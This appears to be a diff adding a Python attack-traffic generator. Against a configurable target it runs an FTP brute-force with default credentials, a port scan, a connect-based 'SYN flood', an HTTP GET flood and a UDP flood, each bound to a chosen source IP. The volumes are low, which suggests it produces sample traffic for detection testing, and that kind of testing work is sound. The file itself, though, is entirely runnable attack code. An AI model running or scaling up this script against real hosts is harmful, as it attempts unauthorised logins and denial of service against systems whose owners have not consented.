@@ -1,0 +1,113 @@
+import socket
+import ftplib
+import requests
+import time
+import random
+import logging
+from requests.adapters import HTTPAdapter
+
+# Configuration
+SOURCE_IP = "NONE"  # 
+TARGET_IP = "NONE"
+FTP_PORT = 21
+HTTP_PORT = 80
+
+# Attack intensity
+FTP_ATTEMPTS = 100
+SCAN_PORTS = 50
+SYN_PACKETS = 40
+HTTP_FLOOD = 50
+
+MIN_DELAY = 0.1
+MAX_DELAY = 0.5
+TIMEOUT = 3
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - [ATTACK] - %(message)s')
+
+# Helper for Requests to use a specific Source IP
+class SourceAddrAdapter(HTTPAdapter):
+    def __init__(self, source_address, **kwargs):
+        self.source_address = source_address
+        super().__init__(**kwargs)
+
+    def init_poolmanager(self, connections, maxsize, block=False):
+        from urllib3.poolmanager import PoolManager
+        self.poolmanager = PoolManager(
+            num_pools=connections, maxsize=maxsize,
+            block=block, source_address=(self.source_address, 0))
+
+def ftp_brute_force():
+    logging.info(f"\n[1] FTP BRUTE-FORCE (From: {SOURCE_IP})")
+    for i in range(FTP_ATTEMPTS):
+        user, passwd = random.choice(["admin", "root"]), random.choice(["123456", "password"])
+        try:
+            ftp = ftplib.FTP()
+            # Added source_address parameter
+            ftp.connect(TARGET_IP, FTP_PORT, timeout=TIMEOUT, source_address=(SOURCE_IP, 0))
+            try:
+                ftp.login(user, passwd)
+                ftp.quit()
+            except ftplib.error_perm:
+                pass
+        except Exception:
+            pass
+        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
+
+def port_scan():
+    logging.info(f"\n[2] PORT SCAN (From: {SOURCE_IP})")
+    for i in range(SCAN_PORTS):
+        port = random.randint(1, 1024)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            # Bind to the attack IP before connecting
+            sock.bind((SOURCE_IP, 0))
+            sock.connect_ex((TARGET_IP, port))
+            sock.close()
+        except: pass
+        time.sleep(0.01)
+
+def syn_flood_simulation():
+    logging.info(f"\n[3] SYN FLOOD (From: {SOURCE_IP})")
+    for i in range(SYN_PACKETS):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.bind((SOURCE_IP, 0)) # Force source
+            sock.settimeout(0.5)
+            sock.connect_ex((TARGET_IP, HTTP_PORT))
+            sock.close()
+        except: pass
+        time.sleep(0.1)
+
+def http_flood():
+    logging.info(f"\n[4] HTTP FLOOD (From: {SOURCE_IP})")
+    session = requests.Session()
+    # Apply the custom adapter to force the source IP
+    session.mount("http://", SourceAddrAdapter(SOURCE_IP))
+    
+    for i in range(HTTP_FLOOD):
+        try:
+            url = f"http://{TARGET_IP}/?id={random.randint(1, 9999)}"
+            session.get(url, timeout=0.5)
+        except: pass
+        time.sleep(0.1)
+
+def udp_flood():
+    logging.info(f"\n[5] UDP FLOOD (From: {SOURCE_IP})")
+    for i in range(30):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.bind((SOURCE_IP, 0)) # Force source
+            sock.sendto(b"A" * 64, (TARGET_IP, random.randint(1024, 65535)))
+            sock.close()
+        except: pass
+        time.sleep(0.1)
+
+if __name__ == "__main__":
+    print(f"Starting attack generation from {SOURCE_IP}...")
+    ftp_brute_force()
+    port_scan()
+    syn_flood_simulation()
+    http_flood()
+    udp_flood()
+    print("Done.")
